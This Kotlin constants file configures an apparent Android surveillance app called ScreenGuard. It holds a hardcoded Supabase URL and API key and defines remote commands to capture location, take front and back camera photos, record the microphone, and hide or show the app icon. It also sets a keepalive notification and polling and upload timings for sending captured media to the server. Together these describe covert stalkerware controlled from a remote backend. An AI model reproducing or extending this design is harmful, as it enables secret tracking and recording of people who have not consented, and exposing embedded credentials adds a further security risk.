package com.guard.screen.core

object Constants {

    // ============================================
    // SUPABASE CONFIG
    // ============================================

    const val SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co"

    const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U"

    // ============================================
    // PREFERENCES
    // ============================================

    const val PREFS_NAME = "screenguard_prefs"
    const val KEY_DEVICE_KEY = "device_key"
    const val KEY_SETUP_DONE = "setup_done"
    const val KEY_ICON_HIDDEN = "icon_hidden"
    const val KEY_LAST_SEEN = "last_seen"

    // ============================================
    // NOTIFICATION
    // ============================================

    const val CHANNEL_SERVICE = "screenguard_service"

    const val NOTIF_ID_SERVICE = 1001
    const val NOTIF_ID_KEEPALIVE = 1004

    // ============================================
    // SUPABASE TABLES
    // ============================================

    const val TABLE_DEVICES = "devices"
    const val TABLE_COMMANDS = "commands"
    const val TABLE_MEDIA = "media"

    const val BUCKET_MEDIA = "media"

    // ============================================
    // COMMANDS
    // ============================================

    // Location
    const val CMD_LOCATION = "LOCATION"

    // Camera
    const val CMD_CAM_FRONT = "CAM_FRONT"
    const val CMD_CAM_BACK = "CAM_BACK"

    // Mic
    const val CMD_MIC_RECORD = "MIC_RECORD"
    const val CMD_MIC_STOP = "MIC_STOP"

    // Device
    const val CMD_PING = "PING"
    const val CMD_HIDE = "HIDE"
    const val CMD_SHOW = "SHOW"

    // ============================================
    // STATUS
    // ============================================

    const val STATUS_PENDING = "pending"
    const val STATUS_PROCESSING = "processing"
    const val STATUS_DONE = "done"
    const val STATUS_FAILED = "failed"

    // ============================================
    // MEDIA TYPES
    // ============================================

    const val MEDIA_TYPE_PHOTO = "photo"
    const val MEDIA_TYPE_AUDIO = "audio"
    const val MEDIA_TYPE_LOCATION = "location"

    // ============================================
    // TIMING
    // ============================================

    const val COMMAND_POLL_INTERVAL_MS = 5000L
    const val HEARTBEAT_INTERVAL_MIN = 5L

    const val DEFAULT_MIC_DURATION = 60
    const val MAX_DURATION = 1800

    // ============================================
    // RETRY
    // ============================================

    const val MAX_UPLOAD_RETRY = 3
    const val UPLOAD_RETRY_DELAY_MS = 5000L
}
